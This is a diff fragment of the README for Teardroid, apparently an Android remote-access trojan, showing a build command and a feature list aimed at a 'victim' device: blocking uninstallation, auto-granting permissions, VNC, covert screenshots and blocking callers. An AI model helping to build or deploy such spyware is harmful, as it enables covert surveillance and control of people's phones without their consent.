@@ -275,10 +275,10 @@ $ python Teardroid.py -b your_app_name
 - open url
 - open apps
 - auto allow permission
-- uninstall protection (work on both non-chinese phones like samsung pixel etc and chinese phones like xiaomi, realme, oppo, vivo etc)
+- uninstall protection (stop the victim from uninstalling the app)
 - vnc
-- take screenshot
-- automatically take screenshot when user open any specific app
+- take screenshot 
+- automatically take screenshot when user open any specific app 
 - block number ( you can block number from victim device so the number can't call the victim )
 
 #### Interested in scatter alfa
